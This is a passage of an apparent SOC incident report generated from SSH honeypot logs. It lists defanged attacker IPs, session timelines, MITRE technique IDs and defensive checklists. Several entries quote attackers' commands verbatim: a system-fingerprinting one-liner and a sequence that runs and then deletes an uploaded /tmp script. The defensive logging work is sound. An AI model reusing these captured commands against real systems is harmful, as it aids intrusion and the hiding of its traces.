|---|---|
| `2026-08-03 21:06:16` | `cowrie.session.connect` |
| `2026-08-03 21:06:17` | `cowrie.client.version` |
| `2026-08-03 21:06:17` | `cowrie.client.kex` |
| `2026-08-03 21:06:18` | `cowrie.login.success` |
| `2026-08-03 21:06:19` | `cowrie.session.params` |
| `2026-08-03 21:06:19` | `cowrie.command.input` |
| `2026-08-03 21:06:19` | `cowrie.command.input` |
| `2026-08-03 21:06:19` | `cowrie.command.input` |
| `2026-08-03 21:06:19` | `cowrie.command.input` |
| `2026-08-03 21:06:19` | `cowrie.command.input` |
| `2026-08-03 21:06:19` | `cowrie.command.success` |
| `2026-08-03 21:06:19` | `cowrie.command.input` |
| `2026-08-03 21:06:19` | `cowrie.command.input` |
| `2026-08-03 21:06:19` | `cowrie.command.input` |
| `2026-08-03 21:06:19` | `cowrie.command.input` |
| `2026-08-03 21:06:20` | `cowrie.log.closed` |
| `2026-08-03 21:06:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc16955ac00a

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-08-03 21:07 |
| **Last Seen** | 2026-08-03 21:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:07:06` | `cowrie.session.connect` |
| `2026-08-03 21:07:06` | `cowrie.client.version` |
| `2026-08-03 21:07:07` | `cowrie.client.kex` |
| `2026-08-03 21:07:07` | `cowrie.login.success` |
| `2026-08-03 21:07:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47fae02d1244

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-08-03 21:07 |
| **Last Seen** | 2026-08-03 21:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:07:07` | `cowrie.session.connect` |
| `2026-08-03 21:07:07` | `cowrie.client.version` |
| `2026-08-03 21:07:07` | `cowrie.client.kex` |
| `2026-08-03 21:07:08` | `cowrie.login.success` |
| `2026-08-03 21:07:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d8c16be36b1

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-08-03 21:07 |
| **Last Seen** | 2026-08-03 21:09 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:07:25` | `cowrie.session.connect` |
| `2026-08-03 21:07:25` | `cowrie.client.version` |
| `2026-08-03 21:07:25` | `cowrie.client.kex` |
| `2026-08-03 21:07:26` | `cowrie.login.success` |
| `2026-08-03 21:07:28` | `cowrie.session.file_upload` |
| `2026-08-03 21:07:29` | `cowrie.session.params` |
| `2026-08-03 21:07:29` | `cowrie.command.input` |
| `2026-08-03 21:07:29` | `cowrie.command.input` |
| `2026-08-03 21:07:29` | `cowrie.command.input` |
| `2026-08-03 21:07:29` | `cowrie.command.failed` |
| `2026-08-03 21:07:30` | `cowrie.log.closed` |
| `2026-08-03 21:07:30` | `cowrie.session.params` |
| `2026-08-03 21:07:30` | `cowrie.command.input` |
| `2026-08-03 21:07:31` | `cowrie.log.closed` |
| `2026-08-03 21:07:32` | `cowrie.session.params` |
| `2026-08-03 21:07:32` | `cowrie.command.input` |
| `2026-08-03 21:07:32` | `cowrie.log.closed` |
| `2026-08-03 21:07:33` | `cowrie.session.params` |
| `2026-08-03 21:07:33` | `cowrie.command.input` |
| `2026-08-03 21:07:33` | `cowrie.command.failed` |
| `2026-08-03 21:07:33` | `cowrie.command.failed` |
| `2026-08-03 21:08:34` | `cowrie.session.params` |
| `2026-08-03 21:08:34` | `cowrie.command.input` |
| `2026-08-03 21:09:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03b2b0ceac5a

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-08-03 21:09 |
| **Last Seen** | 2026-08-03 21:12 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:09:51` | `cowrie.session.connect` |
| `2026-08-03 21:09:51` | `cowrie.client.version` |
| `2026-08-03 21:09:51` | `cowrie.client.kex` |
| `2026-08-03 21:09:52` | `cowrie.login.success` |
| `2026-08-03 21:09:54` | `cowrie.session.file_upload` |
| `2026-08-03 21:09:55` | `cowrie.session.params` |
| `2026-08-03 21:09:55` | `cowrie.command.input` |
| `2026-08-03 21:09:55` | `cowrie.command.input` |
| `2026-08-03 21:09:55` | `cowrie.command.input` |
| `2026-08-03 21:09:55` | `cowrie.command.failed` |
| `2026-08-03 21:09:55` | `cowrie.log.closed` |
| `2026-08-03 21:09:56` | `cowrie.session.params` |
| `2026-08-03 21:09:56` | `cowrie.command.input` |
| `2026-08-03 21:09:56` | `cowrie.log.closed` |
| `2026-08-03 21:09:58` | `cowrie.session.params` |
| `2026-08-03 21:09:58` | `cowrie.command.input` |
| `2026-08-03 21:09:58` | `cowrie.log.closed` |
| `2026-08-03 21:09:59` | `cowrie.session.params` |
| `2026-08-03 21:09:59` | `cowrie.command.input` |
| `2026-08-03 21:09:59` | `cowrie.command.failed` |
| `2026-08-03 21:09:59` | `cowrie.command.failed` |
| `2026-08-03 21:11:00` | `cowrie.session.params` |
| `2026-08-03 21:11:00` | `cowrie.command.input` |
| `2026-08-03 21:12:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e12bf55b723

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:11 |
| **Last Seen** | 2026-08-03 21:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:11:04` | `cowrie.session.connect` |
| `2026-08-03 21:11:04` | `cowrie.client.version` |
| `2026-08-03 21:11:04` | `cowrie.client.kex` |
| `2026-08-03 21:11:05` | `cowrie.login.success` |
| `2026-08-03 21:11:07` | `cowrie.session.params` |
| `2026-08-03 21:11:07` | `cowrie.command.input` |
| `2026-08-03 21:11:07` | `cowrie.command.input` |
| `2026-08-03 21:11:07` | `cowrie.command.input` |
| `2026-08-03 21:11:07` | `cowrie.command.input` |
| `2026-08-03 21:11:07` | `cowrie.command.input` |
| `2026-08-03 21:11:07` | `cowrie.command.success` |
| `2026-08-03 21:11:07` | `cowrie.command.input` |
| `2026-08-03 21:11:07` | `cowrie.command.input` |
| `2026-08-03 21:11:07` | `cowrie.command.input` |
| `2026-08-03 21:11:07` | `cowrie.command.input` |
| `2026-08-03 21:11:07` | `cowrie.log.closed` |
| `2026-08-03 21:11:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15f4c40b3f74

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:13 |
| **Last Seen** | 2026-08-03 21:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:13:21` | `cowrie.session.connect` |
| `2026-08-03 21:13:21` | `cowrie.client.version` |
| `2026-08-03 21:13:21` | `cowrie.client.kex` |
| `2026-08-03 21:13:23` | `cowrie.login.success` |
| `2026-08-03 21:13:24` | `cowrie.session.params` |
| `2026-08-03 21:13:24` | `cowrie.command.input` |
| `2026-08-03 21:13:24` | `cowrie.command.input` |
| `2026-08-03 21:13:24` | `cowrie.command.input` |
| `2026-08-03 21:13:24` | `cowrie.command.input` |
| `2026-08-03 21:13:24` | `cowrie.command.input` |
| `2026-08-03 21:13:24` | `cowrie.command.success` |
| `2026-08-03 21:13:24` | `cowrie.command.input` |
| `2026-08-03 21:13:24` | `cowrie.command.input` |
| `2026-08-03 21:13:24` | `cowrie.command.input` |
| `2026-08-03 21:13:24` | `cowrie.command.input` |
| `2026-08-03 21:13:24` | `cowrie.log.closed` |
| `2026-08-03 21:13:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef645adc942c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-03 21:15 |
| **Last Seen** | 2026-08-03 21:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:15:20` | `cowrie.session.connect` |
| `2026-08-03 21:15:20` | `cowrie.client.version` |
| `2026-08-03 21:15:20` | `cowrie.client.kex` |
| `2026-08-03 21:15:20` | `cowrie.login.success` |
| `2026-08-03 21:15:20` | `cowrie.direct-tcpip.request` |
| `2026-08-03 21:15:20` | `cowrie.direct-tcpip.data` |
| `2026-08-03 21:15:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2b0daa037a0

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:15 |
| **Last Seen** | 2026-08-03 21:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:15:40` | `cowrie.session.connect` |
| `2026-08-03 21:15:40` | `cowrie.client.version` |
| `2026-08-03 21:15:40` | `cowrie.client.kex` |
| `2026-08-03 21:15:43` | `cowrie.login.success` |
| `2026-08-03 21:15:44` | `cowrie.session.params` |
| `2026-08-03 21:15:44` | `cowrie.command.input` |
| `2026-08-03 21:15:44` | `cowrie.command.input` |
| `2026-08-03 21:15:44` | `cowrie.command.input` |
| `2026-08-03 21:15:44` | `cowrie.command.input` |
| `2026-08-03 21:15:44` | `cowrie.command.input` |
| `2026-08-03 21:15:44` | `cowrie.command.success` |
| `2026-08-03 21:15:44` | `cowrie.command.input` |
| `2026-08-03 21:15:44` | `cowrie.command.input` |
| `2026-08-03 21:15:44` | `cowrie.command.input` |
| `2026-08-03 21:15:44` | `cowrie.command.input` |
| `2026-08-03 21:15:45` | `cowrie.log.closed` |
| `2026-08-03 21:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad5cc462d2b7

| Field | Detail |
|---|---|
| **Source IP** | `177.159.150[.]111` |
| **First Seen** | 2026-08-03 21:15 |
| **Last Seen** | 2026-08-03 21:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:15:47` | `cowrie.session.connect` |
| `2026-08-03 21:15:47` | `cowrie.client.version` |
| `2026-08-03 21:15:47` | `cowrie.client.kex` |
| `2026-08-03 21:15:49` | `cowrie.login.success` |
| `2026-08-03 21:15:49` | `cowrie.direct-tcpip.request` |
| `2026-08-03 21:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.159.150[.]111` to AbuseIPDB if not already reported
- [ ] Block `177.159.150[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c3ccc83b22b

| Field | Detail |
|---|---|
| **Source IP** | `59.46.182[.]10` |
| **First Seen** | 2026-08-03 21:15 |
| **Last Seen** | 2026-08-03 21:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:15:54` | `cowrie.session.connect` |
| `2026-08-03 21:15:55` | `cowrie.client.version` |
| `2026-08-03 21:15:55` | `cowrie.client.kex` |
| `2026-08-03 21:15:57` | `cowrie.login.success` |
| `2026-08-03 21:15:57` | `cowrie.direct-tcpip.request` |
| `2026-08-03 21:16:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.46.182[.]10` to AbuseIPDB if not already reported
- [ ] Block `59.46.182[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9993b79e97b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:17 |
| **Last Seen** | 2026-08-03 21:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:17:57` | `cowrie.session.connect` |
| `2026-08-03 21:17:58` | `cowrie.client.version` |
| `2026-08-03 21:17:58` | `cowrie.client.kex` |
| `2026-08-03 21:18:00` | `cowrie.login.success` |
| `2026-08-03 21:18:01` | `cowrie.session.params` |
| `2026-08-03 21:18:01` | `cowrie.command.input` |
| `2026-08-03 21:18:01` | `cowrie.command.input` |
| `2026-08-03 21:18:01` | `cowrie.command.input` |
| `2026-08-03 21:18:01` | `cowrie.command.input` |
| `2026-08-03 21:18:01` | `cowrie.command.input` |
| `2026-08-03 21:18:01` | `cowrie.command.success` |
| `2026-08-03 21:18:01` | `cowrie.command.input` |
| `2026-08-03 21:18:01` | `cowrie.command.input` |
| `2026-08-03 21:18:01` | `cowrie.command.input` |
| `2026-08-03 21:18:01` | `cowrie.command.input` |
| `2026-08-03 21:18:01` | `cowrie.log.closed` |
| `2026-08-03 21:18:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da74b00a1947

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:20 |
| **Last Seen** | 2026-08-03 21:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:20:12` | `cowrie.session.connect` |
| `2026-08-03 21:20:12` | `cowrie.client.version` |
| `2026-08-03 21:20:12` | `cowrie.client.kex` |
| `2026-08-03 21:20:14` | `cowrie.login.success` |
| `2026-08-03 21:20:15` | `cowrie.session.params` |
| `2026-08-03 21:20:15` | `cowrie.command.input` |
| `2026-08-03 21:20:15` | `cowrie.command.input` |
| `2026-08-03 21:20:15` | `cowrie.command.input` |
| `2026-08-03 21:20:15` | `cowrie.command.input` |
| `2026-08-03 21:20:15` | `cowrie.command.input` |
| `2026-08-03 21:20:15` | `cowrie.command.success` |
| `2026-08-03 21:20:15` | `cowrie.command.input` |
| `2026-08-03 21:20:15` | `cowrie.command.input` |
| `2026-08-03 21:20:15` | `cowrie.command.input` |
| `2026-08-03 21:20:15` | `cowrie.command.input` |
| `2026-08-03 21:20:16` | `cowrie.log.closed` |
| `2026-08-03 21:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-411501507699

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:22 |
| **Last Seen** | 2026-08-03 21:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:22:33` | `cowrie.session.connect` |
| `2026-08-03 21:22:33` | `cowrie.client.version` |
| `2026-08-03 21:22:33` | `cowrie.client.kex` |
| `2026-08-03 21:22:34` | `cowrie.login.success` |
| `2026-08-03 21:22:35` | `cowrie.session.params` |
| `2026-08-03 21:22:35` | `cowrie.command.input` |
| `2026-08-03 21:22:35` | `cowrie.command.input` |
| `2026-08-03 21:22:35` | `cowrie.command.input` |
| `2026-08-03 21:22:35` | `cowrie.command.input` |
| `2026-08-03 21:22:35` | `cowrie.command.input` |
| `2026-08-03 21:22:35` | `cowrie.command.success` |
| `2026-08-03 21:22:35` | `cowrie.command.input` |
| `2026-08-03 21:22:35` | `cowrie.command.input` |
| `2026-08-03 21:22:35` | `cowrie.command.input` |
| `2026-08-03 21:22:35` | `cowrie.command.input` |
| `2026-08-03 21:22:36` | `cowrie.log.closed` |
| `2026-08-03 21:22:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc27f12bc3b4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 21:24 |
| **Last Seen** | 2026-08-03 21:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:24:54` | `cowrie.session.connect` |
| `2026-08-03 21:24:55` | `cowrie.client.version` |
| `2026-08-03 21:24:55` | `cowrie.client.kex` |
| `2026-08-03 21:24:56` | `cowrie.login.success` |
| `2026-08-03 21:24:57` | `cowrie.session.params` |
| `2026-08-03 21:24:57` | `cowrie.command.input` |
| `2026-08-03 21:24:57` | `cowrie.command.input` |
| `2026-08-03 21:24:57` | `cowrie.command.input` |
| `2026-08-03 21:24:57` | `cowrie.command.input` |
| `2026-08-03 21:24:57` | `cowrie.command.input` |
| `2026-08-03 21:24:57` | `cowrie.command.success` |
| `2026-08-03 21:24:57` | `cowrie.command.input` |
| `2026-08-03 21:24:57` | `cowrie.command.input` |
| `2026-08-03 21:24:57` | `cowrie.command.input` |
| `2026-08-03 21:24:57` | `cowrie.command.input` |
| `2026-08-03 21:24:57` | `cowrie.log.closed` |
| `2026-08-03 21:24:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52420d11dff2

| Field | Detail |
|---|---|
| **Source IP** | `122.160.15[.]31` |
| **First Seen** | 2026-08-03 21:25 |
| **Last Seen** | 2026-08-03 21:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 21:25:30` | `cowrie.session.connect` |
| `2026-08-03 21:25:31` | `cowrie.client.version` |
| `2026-08-03 21:25:31` | `cowrie.client.kex` |
| `2026-08-03 21:25:32` | `cowrie.login.success` |
| `2026-08-03 21:25:33` | `cowrie.direct-tcpip.request` |
| `2026-08-03 21:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.15[.]31` to AbuseIPDB if not already reported
- [ ] Block `122.160.15[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab685d7ac992

| Field | Detail |
|---|---|
| **Source IP** | `179.181.133[.]153` |
| **First Seen** | 2026-08-03 21:25 |
| **Last Seen** | 2026-08-03 21:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
